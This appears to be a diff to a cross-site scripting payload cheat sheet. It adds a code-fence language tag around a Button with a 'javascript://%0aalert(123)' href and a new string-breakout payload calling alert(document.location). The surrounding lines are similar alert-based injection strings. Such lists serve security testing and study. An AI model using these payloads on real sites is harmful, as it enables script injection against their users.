@@ -6,7 +6,7 @@
 ```
 
 **Button**
-```
+```javascript
 <Button href="javascript://%0aalert(123)">
 XSS with %0a
 </Button>
@@ -50,6 +50,7 @@ javascript://%0aalert(1)
 \\'); alert(\'xss\');var x=\'
 ‘; alert(1);
 ‘)alert(1);//
+', alert(document.location), '
 ```
 
 ```
